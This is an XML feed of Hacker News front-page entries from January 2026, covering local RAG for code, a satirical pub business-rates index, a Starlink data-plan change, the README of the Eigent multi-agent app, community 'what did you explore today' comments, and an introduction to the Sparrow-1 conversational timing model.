<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2026-01-15T05:17:45.836495+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46616529</id><title>Ask HN: How are you doing RAG locally?</title><updated>2026-01-15T05:17:56.060776+00:00</updated><content>&lt;doc fingerprint="67932bf69b8e93ce"&gt;
  &lt;main&gt;
    &lt;p&gt;Don't use a vector database for code, embeddings are slow and bad for code. Code likes bm25+trigram, that gets better results while keeping search responses snappy.&lt;/p&gt;
    &lt;p&gt;static embedding models im finding quite fast lee101/gobed https://github.com/lee101/gobed is 1ms on gpu :) would need to be trained for code though the bigger code llm embeddings can be high quality too so its just yea about where is ideal on the pareto fronteir really , often yea though your right it tends to be bm25 or rg even for code but yea more complex solutions are kind of possible too if its really important the search is high quality&lt;/p&gt;
    &lt;p&gt;lee101/gobed https://github.com/lee101/gobed static embedding models so they are embedded in milliseconds and on gpu search with a cagra style on gpu index with a few things for speed like int8 quantization on the embeddings and fused embedding and search in the same kernel as the embedding really is just a trained map of embeddings per token/averaging&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46616529"/><published>2026-01-14T14:38:29+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46617360</id><title>Find a pub that needs you</title><updated>2026-01-15T05:17:55.322682+00:00</updated><content>&lt;doc fingerprint="f02c34496935903"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;FIND A PUB&lt;lb/&gt;THAT NEEDS YOU&lt;/head&gt;
    &lt;p&gt;The government's signalled a potential u-turn on pub rates ‚Äî but nothing's confirmed yet. Pubs still need your support. Find your local. See what they're up against. Buy a pint.&lt;/p&gt;
    &lt;head rend="h2"&gt;THE FUCKED PUB INDEX&lt;/head&gt;
    &lt;p&gt;Our world-class data scientists (one guy with a spreadsheet) have developed the Fucked Pub Index‚Ñ¢ ‚Äî a groundbreaking metric that combines advanced geospatial analysis (Google Maps) with sophisticated fiscal impact modelling (basic maths) to identify the pub near you that most urgently requires your patronage.&lt;/p&gt;
    &lt;p&gt;...&lt;/p&gt;
    &lt;p&gt;Pubs Analysed&lt;/p&gt;
    &lt;p&gt;...&lt;/p&gt;
    &lt;p&gt;Facing Increases&lt;/p&gt;
    &lt;p&gt;...&lt;/p&gt;
    &lt;p&gt;Fucked or Worse&lt;/p&gt;
    &lt;p&gt;2026&lt;/p&gt;
    &lt;p&gt;Revaluation Year&lt;/p&gt;
    &lt;p&gt;Based on VOA rateable value data for ... verified pubs (SCAT 249). Some industry experts estimate the actual number of affected pubs is even higher. The government has signalled support is coming ‚Äî we'll update when details are announced.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.ismypubfucked.com/"/><published>2026-01-14T15:44:22+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46617668</id><title>Roam 50GB is now Roam 100GB</title><updated>2026-01-15T05:17:54.754908+00:00</updated><content>&lt;doc fingerprint="764cb8ffe0c8aa8e"&gt;
  &lt;main&gt;
    &lt;p&gt;On January 13, 2026, Starlink doubled the amount of high-speed data on Roam 50GB to 100GB, at no additional cost and in most markets. Here is all you need to know about what's changed and what hasn't.&lt;/p&gt;
    &lt;p&gt;Once you‚Äôve used 100GB of your high-speed Roam data, your service automatically continues with unlimited low-speed data for the remainder of your billing period. You‚Äôll still be connected for basic use like calls and texts, but activities such as streaming, downloading, and video calls may be limited.&lt;/p&gt;
    &lt;p&gt;We‚Äôll notify you when you reach 80% and 100% of your monthly high-speed Roam data. To restore high-speed Roam service, you can upgrade to Roam Unlimited. Please note that this upgrade will remain in effect for future billing cycles. You can switch back to Roam 100GB as needed. If you want to switch back before your next biling cycle, you'll need to manually change plans in your account portal.&lt;/p&gt;
    &lt;p&gt;No. Your service will not stop. You‚Äôll continue to have internet access--with unlimited data--at reduced speeds until your next billing cycle begins.&lt;/p&gt;
    &lt;p&gt;Low-speed data supports basic connectivity such as email, calls, and texts. Activities that rely on higher speeds‚Äîlike streaming video, large downloads, or video calls‚Äîwill be limited.&lt;/p&gt;
    &lt;p&gt;You can upgrade anytime to Roam Unlimited to restore high-speed service. Please note that upgrading to Roam Unlimited will remain in effect for future billing cycles.&lt;/p&gt;
    &lt;p&gt;With the exception of Ocean Mode, per-GB data purchases are no longer available on Roam plans. Customers now automatically move to unlimited low-speed data after reaching their high-speed Roam 100GB limit, with the option to upgrade to Roam Unlimited for continued high-speed access.&lt;/p&gt;
    &lt;p&gt;Yes, with the same previous conditions as Roam 50GB:&lt;/p&gt;
    &lt;p&gt;In the following markets, Roam 50GB is still available and Roam 100GB is not available:&lt;/p&gt;
    &lt;p&gt;Austria&lt;/p&gt;
    &lt;p&gt;Hungary&lt;/p&gt;
    &lt;p&gt;Croatia&lt;/p&gt;
    &lt;p&gt;Bangladesh&lt;/p&gt;
    &lt;p&gt;Bhutan&lt;/p&gt;
    &lt;p&gt;Botswana&lt;/p&gt;
    &lt;p&gt;Brunei&lt;/p&gt;
    &lt;p&gt;Cape Verde&lt;/p&gt;
    &lt;p&gt;Cook Islands&lt;/p&gt;
    &lt;p&gt;Costa Rica&lt;/p&gt;
    &lt;p&gt;Democratic Republic of the Congo&lt;/p&gt;
    &lt;p&gt;Eswatini&lt;/p&gt;
    &lt;p&gt;Gambia&lt;/p&gt;
    &lt;p&gt;Ghana&lt;/p&gt;
    &lt;p&gt;Kenya&lt;/p&gt;
    &lt;p&gt;Lesotho&lt;/p&gt;
    &lt;p&gt;Liberia&lt;/p&gt;
    &lt;p&gt;Malawi&lt;/p&gt;
    &lt;p&gt;Maldives&lt;/p&gt;
    &lt;p&gt;Mongolia&lt;/p&gt;
    &lt;p&gt;Mozambique&lt;/p&gt;
    &lt;p&gt;Nauru&lt;/p&gt;
    &lt;p&gt;Nigeria&lt;/p&gt;
    &lt;p&gt;Oman&lt;/p&gt;
    &lt;p&gt;Qatar&lt;/p&gt;
    &lt;p&gt;Rwanda&lt;/p&gt;
    &lt;p&gt;Sierra Leone&lt;/p&gt;
    &lt;p&gt;Somalia&lt;/p&gt;
    &lt;p&gt;South Sudan&lt;/p&gt;
    &lt;p&gt;Sri Lanka&lt;/p&gt;
    &lt;p&gt;Togo&lt;/p&gt;
    &lt;p&gt;Tonga&lt;/p&gt;
    &lt;p&gt;United Arab Emirates&lt;/p&gt;
    &lt;p&gt;Vanuatu&lt;/p&gt;
    &lt;p&gt;Zambia&lt;/p&gt;
    &lt;p&gt;Zimbabwe&lt;/p&gt;
    &lt;p&gt;Can't find what you're looking for? Contact Support.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://starlink.com/support/article/58c9c8b7-474e-246f-7e3c-06db3221d34d"/><published>2026-01-14T16:03:11+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46618714</id><title>Ask HN: Share your personal website</title><updated>2026-01-15T05:17:52.184487+00:00</updated><content>&lt;doc fingerprint="a785b41f6be747ae"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;Hello HN! I am putting together a community-maintained directory of personal websites at &amp;lt;https://hnpwd.github.io/&amp;gt;. More details about the project can be found in the README at &amp;lt;https://github.com/hnpwd/hnpwd.github.io#readme&amp;gt;.&lt;/p&gt;
      &lt;p&gt;As you can see, the directory currently has only a handful of entries. I need your help to grow it. If you have a personal website, I would be glad if you shared it here. If your website is hosted on a web space where you have full control over its design and content, and if it has been well received in past HN discussions, I might add it to the directory. Just drop a link in the comments. Please let me know if you do not want your website to be included in the directory.&lt;/p&gt;
      &lt;p&gt;Also, I intend this to be a community maintained resource, so if you would like to join the GitHub project as a maintainer, please let me know either here or via the IRC link in the README.&lt;/p&gt;
      &lt;p&gt;By the way, see also 'Ask HN: Could you share your personal blog here?' - https://news.ycombinator.com/item?id=36575081 - July 2023 - (1014 points, 1940 comments). In this post, the scope is not restricted to blogs though. Any personal website is welcome, whether it is a blog, digital garden, personal wiki or something else entirely.&lt;/p&gt;
      &lt;p&gt;UPDATE: It is going to take a while to go through all the submissions and add them. If you'd like to help with the process, please send a PR directly to this project: https://github.com/hnpwd/hnpwd.github.io&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46618714"/><published>2026-01-14T17:07:42+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46618954</id><title>Eigent: An open source Claude Cowork alternative</title><updated>2026-01-15T05:17:51.599953+00:00</updated><content>&lt;doc fingerprint="6d169f7b47bba5cc"&gt;
  &lt;main&gt;
    &lt;p&gt;English ¬∑ ÁÆÄ‰Ωì‰∏≠Êñá ¬∑ Official Site ¬∑ Documents ¬∑ Feedback&lt;/p&gt;
    &lt;p&gt;Eigent is the open source cowork desktop application, empowering you to build, manage, and deploy a custom AI workforce that can turn your most complex workflows into automated tasks.&lt;/p&gt;
    &lt;p&gt;Built on CAMEL-AI's acclaimed open-source project, our system introduces a Multi-Agent Workforce that boosts productivity through parallel execution, customization, and privacy protection.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;‚úÖ Zero Setup - No technical configuration required&lt;/item&gt;
      &lt;item&gt;‚úÖ Multi-Agent Coordination - Handle complex multi-agent workflows&lt;/item&gt;
      &lt;item&gt;‚úÖ Enterprise Feature - SSO/Access control&lt;/item&gt;
      &lt;item&gt;‚úÖ Local Deployment&lt;/item&gt;
      &lt;item&gt;‚úÖ Open Source&lt;/item&gt;
      &lt;item&gt;‚úÖ Custom Model Support&lt;/item&gt;
      &lt;item&gt;‚úÖ MCP Integration&lt;/item&gt;
    &lt;/list&gt;
    &lt;head&gt;Table of contents&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;üöÄ Getting Started&lt;/item&gt;
      &lt;item&gt;‚ú® Key features&lt;/item&gt;
      &lt;item&gt;üß© Use Cases&lt;/item&gt;
      &lt;item&gt;üõ†Ô∏è Tech Stack&lt;/item&gt;
      &lt;item&gt;üåü Staying ahead&lt;/item&gt;
      &lt;item&gt;üó∫Ô∏è Roadmap&lt;/item&gt;
      &lt;item&gt;üìñ Contributing&lt;/item&gt;
      &lt;item&gt;Ecosystem&lt;/item&gt;
      &lt;item&gt;üìÑ Open Source License&lt;/item&gt;
      &lt;item&gt;üåê Community &amp;amp; contact&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;üîì Build in Public ‚Äî Eigent is 100% open source from day one. Every feature, every commit, every decision is transparent. We believe the best AI tools should be built openly with the community, not behind closed doors.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The recommended way to run Eigent ‚Äî fully standalone with complete control over your data, no cloud account required.&lt;/p&gt;
    &lt;p&gt;This setup includes:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Local backend server with full API&lt;/item&gt;
      &lt;item&gt;Local model integration (vLLM, Ollama, LM Studio, etc.)&lt;/item&gt;
      &lt;item&gt;Complete isolation from cloud services&lt;/item&gt;
      &lt;item&gt;Zero external dependencies&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For a quick preview using our cloud backend ‚Äî get started in seconds:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Node.js (version 18-22) and npm&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;git clone https://github.com/eigent-ai/eigent.git
cd eigent
npm install
npm run dev&lt;/code&gt;
    &lt;quote&gt;
      &lt;p&gt;Note: This mode connects to Eigent cloud services and requires account registration. For a fully standalone experience, use Local Deployment instead.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;For organizations requiring maximum security, customization, and control:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Exclusive Features (like SSO &amp;amp; custom development)&lt;/item&gt;
      &lt;item&gt;Scalable Enterprise Deployment&lt;/item&gt;
      &lt;item&gt;Negotiated SLAs &amp;amp; implementation services&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;üìß For further details, please contact us at info@eigent.ai.&lt;/p&gt;
    &lt;p&gt;For teams who prefer managed infrastructure, we also offer a cloud platform. The fastest way to experience Eigent's multi-agent AI capabilities without setup complexity. We'll host the models, APIs, and cloud storage, ensuring Eigent runs flawlessly.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Instant Access - Start building multi-agent workflows in minutes.&lt;/item&gt;
      &lt;item&gt;Managed Infrastructure - We handle scaling, updates, and maintenance.&lt;/item&gt;
      &lt;item&gt;Premium Support - Subscribe and get priority assistance from our engineering team.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Unlock the full potential of exceptional productivity with Eigent‚Äôs powerful features‚Äîbuilt for seamless integration, smarter task execution, and boundless automation.&lt;/p&gt;
    &lt;p&gt;Employs a team of specialized AI agents that collaborate to solve complex tasks. Eigent dynamically breaks down tasks and activates multiple agents to work in parallel.&lt;/p&gt;
    &lt;p&gt;Eigent pre-defined the following agent workers:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Developer Agent: Writes and executes code, runs terminal commands.&lt;/item&gt;
      &lt;item&gt;Search Agent: Searches the web and extracts content.&lt;/item&gt;
      &lt;item&gt;Document Agent: Creates and manages documents.&lt;/item&gt;
      &lt;item&gt;Multi-Modal Agent: Processes images and audio.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Deploy Eigent locally with your preferred models.&lt;/p&gt;
    &lt;p&gt;Eigent comes with massive built-in Model Context Protocol (MCP) tools (for web browsing, code execution, Notion, Google suite, Slack etc.), and also lets you install your own tools. Equip agents with exactly the right tools for your scenarios ‚Äì even integrate internal APIs or custom functions ‚Äì to enhance their capabilities.&lt;/p&gt;
    &lt;p&gt;If a task gets stuck or encounters uncertainty, Eigent will automatically request human input.&lt;/p&gt;
    &lt;p&gt;Eigent is completely open-sourced. You can download, inspect, and modify the code, ensuring transparency and fostering a community-driven ecosystem for multi-agent innovation.&lt;/p&gt;
    &lt;head rend="h3"&gt;1. Palm Springs Tennis Trip Itinerary with Slack Summary Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: We are two tennis fans and want to go see the tennis tournament ...&lt;/head&gt;
    &lt;p&gt;We are two tennis fans and want to go see the tennis tournament in Palm Springs 2026. I live in SF - please prepare a detailed itinerary with flights, hotels, things to do for 3 days - around the time semifinal/finals are happening. We like hiking, vegan food and spas. Our budget is $5K. The itinerary should be a detailed timeline of time, activity, cost, other details and if applicable a link to buy tickets/make reservations etc. for the item. Some preferences .Spa access would be nice but not necessary. When you finish this task, please generate a html report about this trip; write a summary of this plan and send text summary and report html link to slack #tennis-trip-sf channel.&lt;/p&gt;
    &lt;head rend="h3"&gt;2. Generate Q2 Report from CSV Bank Data Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: Please help me prepare a Q2 financial statement based on my bank ...&lt;/head&gt;
    &lt;p&gt;Please help me prepare a Q2 financial statement based on my bank transfer record file bank_transacation.csv in my desktop to a html report with chart to investors how much we have spent.&lt;/p&gt;
    &lt;head rend="h3"&gt;3. UK Healthcare Market Research Report Automation Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: Analyze the UK healthcare industry to support the planning ...&lt;/head&gt;
    &lt;p&gt;Analyze the UK healthcare industry to support the planning of my next company. Provide a comprehensive market overview, including current trends, growth projections, and relevant regulations. Identify the top 5‚Äì10 major opportunities, gaps, or underserved segments within the market. Present all findings in a well-structured, professional HTML report. Then send a message to slack #eigentr-product-test channel when this task is done to align the report content with my teammates.&lt;/p&gt;
    &lt;head rend="h3"&gt;4. German Electric Skateboard Market Feasibility Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: We are a company that produces high-end electric skateboards ...&lt;/head&gt;
    &lt;p&gt;We are a company that produces high-end electric skateboards, and we are considering entering the German market. Please prepare a detailed market entry feasibility report for me. The report needs to cover the following aspects: 1. Market Size &amp;amp; Regulations: Research the market size, annual growth rate, key players, and market share for Personal Light Electric Vehicles (PLEVs) in Germany. Simultaneously, provide a detailed breakdown and summary of German laws and regulations concerning the use of electric skateboards on public roads, including certification requirements (such as ABE certification) and insurance policies. 2. Consumer Profile: Analyze the profile of potential German consumers, including their age, income level, primary usage scenarios (commuting, recreation), key purchasing decision drivers (price, performance, brand, design), and the channels they typically use to gather information (forums, social media, offline retail stores). 3. Channels &amp;amp; Distribution: Investigate Germany‚Äôs mainstream online electronics sales platforms (e.g., Amazon.de, MediaMarkt.de) and high-end sporting goods offline retail chains. List the top 5 potential online and offline distribution partners and find the contact information for their purchasing departments, if possible. 4. Costing &amp;amp; Pricing: Based on the product cost structure in my Product_Cost.csv file on my desktop, and taking into account German customs duties, Value Added Tax (VAT), logistics and warehousing costs, and potential marketing expenses, estimate a Manufacturer‚Äôs Suggested Retail Price (MSRP) and analyze its competitiveness in the market. 5. Comprehensive Report &amp;amp; Presentation: Summarize all research findings into an HTML report file. The content should include data charts, key findings, and a final market entry strategy recommendation (Recommended / Not Recommended / Recommended with Conditions).&lt;/p&gt;
    &lt;head rend="h3"&gt;5. SEO Audit for Workforce Multiagent Launch Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: To support the launch of our new Workforce Multiagent product ...&lt;/head&gt;
    &lt;p&gt;To support the launch of our new Workforce Multiagent product, please run a thorough SEO audit on our official website (https://www.camel-ai.org/) and deliver a detailed optimization report with actionable recommendations.&lt;/p&gt;
    &lt;head rend="h3"&gt;6. Identify Duplicate Files in Downloads Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: I have a folder named mydocs inside my Documents directory ...&lt;/head&gt;
    &lt;p&gt;I have a folder named mydocs inside my Documents directory. Please scan it and identify all files that are exact or near duplicates ‚Äî including those with identical content, file size, or format (even if file names or extensions differ). List them clearly, grouped by similarity.&lt;/p&gt;
    &lt;head rend="h3"&gt;7. Add Signature to PDF Replay &lt;g-emoji&gt;‚ñ∂Ô∏è&lt;/g-emoji&gt;&lt;/head&gt;
    &lt;head&gt;Prompt: Please add this signature image to the Signature Areas in the PDF ...&lt;/head&gt;
    &lt;p&gt;Please add this signature image to the Signature Areas in the PDF. You could install the CLI tool ‚Äòtesseract‚Äô (needed for reliable location of ‚ÄòSignature Areas‚Äô via OCR) to help finish this task.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Framework: FastAPI&lt;/item&gt;
      &lt;item&gt;Package Manager: uv&lt;/item&gt;
      &lt;item&gt;Async Server: Uvicorn&lt;/item&gt;
      &lt;item&gt;Authentication: OAuth 2.0, Passlib.&lt;/item&gt;
      &lt;item&gt;Multi-agent framework: CAMEL&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Framework: React&lt;/item&gt;
      &lt;item&gt;Desktop App Framework: Electron&lt;/item&gt;
      &lt;item&gt;Language: TypeScript&lt;/item&gt;
      &lt;item&gt;UI: Tailwind CSS, Radix UI, Lucide React, Framer Motion&lt;/item&gt;
      &lt;item&gt;State Management: Zustand&lt;/item&gt;
      &lt;item&gt;Flow Editor: React Flow&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Important&lt;/p&gt;
    &lt;p&gt;Star Eigent, You will receive all release notifications from GitHub without any delay ~ ‚≠êÔ∏è&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Topics&lt;/cell&gt;
        &lt;cell role="head"&gt;Issues&lt;/cell&gt;
        &lt;cell role="head"&gt;Discord Channel&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Context Engineering&lt;/cell&gt;
        &lt;cell&gt;- Prompt caching&lt;p&gt;- System prompt optimize&lt;/p&gt;&lt;p&gt;- Toolkit docstring optimize&lt;/p&gt;&lt;p&gt;- Context compression&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Multi-modal Enhancement&lt;/cell&gt;
        &lt;cell&gt;- More accurate image understanding when using browser&lt;p&gt;- Advanced video generation&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Multi-agent system&lt;/cell&gt;
        &lt;cell&gt;- Workforce support fixed workflow&lt;p&gt;- Workforce support multi-round conversion&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Browser Toolkit&lt;/cell&gt;
        &lt;cell&gt;- BrowseCamp integration&lt;p&gt;- Benchmark improvement&lt;/p&gt;&lt;p&gt;- Forbid repeated page visiting&lt;/p&gt;&lt;p&gt;- Automatic cache button clicking&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Document Toolkit&lt;/cell&gt;
        &lt;cell&gt;- Support dynamic file editing&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Terminal Toolkit&lt;/cell&gt;
        &lt;cell&gt;- Benchmark improvement&lt;p&gt;- Terminal-Bench integration&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Environment &amp;amp; RL&lt;/cell&gt;
        &lt;cell&gt;- Environment design&lt;p&gt;- Data-generation&lt;/p&gt;&lt;p&gt;- RL framework integration (VERL, TRL, OpenRLHF)&lt;/p&gt;&lt;/cell&gt;
        &lt;cell&gt;Join Discord ‚Üí&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We believe in building trust and embracing all forms of open-source collaborations. Your creative contributions help drive the innovation of &lt;code&gt;Eigent&lt;/code&gt;. Explore our GitHub issues and projects to dive in and show us what you‚Äôve got ü§ù‚ù§Ô∏è Contribution Guideline&lt;/p&gt;
    &lt;p&gt;Eigent is built on top of CAMEL-AI.org's research and infrastructures. Sponsoring CAMEL-AI.org will make &lt;code&gt;Eigent&lt;/code&gt; better.&lt;/p&gt;
    &lt;p&gt;This repository is licensed under the Apache License 2.0.&lt;/p&gt;
    &lt;p&gt;For more information please contact info@eigent.ai&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;
        &lt;p&gt;GitHub Issues: Report bugs, request features, and track development. Submit an issue&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Discord: Get real-time support, chat with the community, and stay updated. Join us&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;X (Twitter): Follow for updates, AI insights, and key announcements. Follow us&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;WeChat Community: Scan the QR code below to add our WeChat assistant, and join our WeChat community group.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/eigent-ai/eigent"/><published>2026-01-14T17:23:01+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46619464</id><title>Ask HN: What did you find out or explore today?</title><updated>2026-01-15T05:17:51.301724+00:00</updated><content>&lt;doc fingerprint="3fcc305f36843691"&gt;
  &lt;main&gt;
    &lt;p&gt;I found out I can automate my 5,12kWh house battery through local-only RS485 connection, and directly setting registers using ModbusTCP from Home Assistant. I then drafted an automation with hysteresis and damping that tries to aim for Net-Zero export/import (pv surplus/grid). It appears to work!&lt;/p&gt;
    &lt;p&gt;I found out my crimson-bellied conure is laying an egg today! She's nesting in some towels now, chirping away while she works on laying it.&lt;/p&gt;
    &lt;p&gt;Having an egg is relatively hard on parrots. I've given her lots of food and warmth to prepare. She is comically hungry -- she's usually not such a big eater, but she's happy today to be scarfing down her apple slices, fruit pellets, and safflower seeds.&lt;/p&gt;
    &lt;p&gt;She usually sleeps at the bottom of her cage, beneath a towel I put down for her. It's already unusual for parrots! But tonight she has made quite a nest with her towel: It's folded in half like usual, but she has nuzzled her way between the fold, so she has the towel underneath and on top of her. It's super cute.&lt;/p&gt;
    &lt;p&gt;I'm treating her with delicacy but she is determined to be a wild child of a bird. She's still flying around during the day and moving around plenty. I don't think I would be so confident if I had an egg like that inside me.&lt;/p&gt;
    &lt;p&gt;She has a stone perch that she likes to nibble on when she's working on an egg. I've wondered if it is some innate need to nourish herself with calcium, or if it's stress relief :)&lt;/p&gt;
    &lt;p&gt;So that's my night. Sitting outside of the metaphorical delivery ward with a metaphorical cigar, making sure she lays this egg that isn't even fertile to begin with! Birds :)&lt;/p&gt;
    &lt;p&gt;I'm looking into rennovating a massive agricultural machine shed ~ two stories high in the middle built some 80+ years ago using sections of spur pipeline as central upright poles to hold up some beefy jarrah trusses.&lt;/p&gt;
    &lt;p&gt;The "verandah" wings flaring out from there were bulit from flimsier timber that's rotting and the iron sheet walls are starting to peel away.&lt;/p&gt;
    &lt;p&gt;The posts are of interest as they have old markings and water fittings, tee pieces, etc.&lt;/p&gt;
    &lt;p&gt;It's not far from one of the original steam powered pumping stations that moved water through the main line.&lt;/p&gt;
    &lt;p&gt;I found out that the adhesives I've encountered from time to time that remain tacky and easily moved or removed are called "non-hardening" adhesives. This was after using E8000 glue for a headphone repair today.&lt;/p&gt;
    &lt;p&gt;I was reminded of the US Constitution's 10th amendment and reading some of the history around it.&lt;/p&gt;
    &lt;p&gt;&amp;gt; The powers not delegated to the United States by the Constitution, nor prohibited by it to the States, are reserved to the States respectively, or to the people.&lt;/p&gt;
    &lt;p&gt;Very relevant to what's going on today with National Guard and ICE deployments.&lt;/p&gt;
    &lt;p&gt;I'm building in robotics. Setting up a new 3d camera today. I found that the 10m active USB C cable that I bought transfers power in both directions, but only transfers data in one direction, it turns out to be some weird video USB variant. Next I needed to plug a gripper into a modbus controller. That uses an M8 8-pole 20cm cable. The controller manufacturer recently decided to switch from male to female connector, so now the cable needs to be male-male. After searching online for hours, I believe that is impossible to find as everyone only sells male-female cables.&lt;/p&gt;
    &lt;p&gt;I'm continuously surprised by how difficult it is to plug things together and how non-descriptive cable "standards" are about the actual capabilities of cables and connectors.&lt;/p&gt;
    &lt;p&gt;I found out today that the location header of an HTTP redirect can be a tel:+ URI and phone's will actually ask you whether you want to call that number.&lt;/p&gt;
    &lt;p&gt;Published an edit today (post dated in Nov. but I've rewritten it 5x now) on my tutorial to use llama3.2:3b to generate fine tuning data to train tinyllama1.1b https://seanneilan.com/posts/fine-tuning-local-llm/ It took a while to figure out that when I made llama3.2 generate json, it didn't have enough horsepower to generate training data that was varied enough to successfully fine tune llama1.1b! Figured that out :) Something you never learn with the bigger models. Every token costs something even if it's a little bit.&lt;/p&gt;
    &lt;p&gt;I've been exploring the origins of the 'relational turn' in psychoanalysis that began after WWII and ramped up in the 1970s. Psychoanalysis got vastly more interesting after Freud and I had no idea!&lt;/p&gt;
    &lt;p&gt;I've been trying to research drone navigation tech from what wegave learned so far from the russian/ukraine war. I'm very much not a hardware guy but software by itself has been feeling kind of useless or even crueler than usual.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://news.ycombinator.com/item?id=46619464"/><published>2026-01-14T17:54:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46619614</id><title>Show HN: Sparrow-1 ‚Äì Audio-native model for human-level turn-taking without ASR</title><updated>2026-01-15T05:17:50.933157+00:00</updated><content>&lt;doc fingerprint="34dbeb9a0b368fab"&gt;
  &lt;main&gt;
    &lt;p&gt;All Posts&lt;/p&gt;
    &lt;p&gt;Sparrow-1 is a specialized, multilingual audio model for real-time conversational flow and floor transfer. It predicts when a system should listen, wait, or speak, enabling response timing that mirrors human conversation rather than simply responding as fast as possible.&lt;/p&gt;
    &lt;p&gt;Despite major advances in LLMs and TTS, conversational AI still lacks reliable human-level timing. Traditional voice systems wait for silence, then respond. Sparrow-1 instead models conversational timing continuously. This allows it to respond quickly, even instantaneously when the speaker is clearly done, all while deliberately waiting when they√¢re not.&lt;/p&gt;
    &lt;p&gt;The difference is subtle but transformative: Sparrow-1 doesn't just respond as fast as possible. It responds at the moment a human listener would.&lt;/p&gt;
    &lt;head rend="h2"&gt;Timing Is the Hard Part&lt;/head&gt;
    &lt;p&gt;Conversation is not just an exchange of words. It is a real-time coordination task where participants continuously anticipate when to respond, drawing on rhythm, hesitation, intonation, and meaning at the same time. Sparrow-1 models this coordination directly, aligning its behavior with the timing patterns humans use subconsciously during dialogue.&lt;/p&gt;
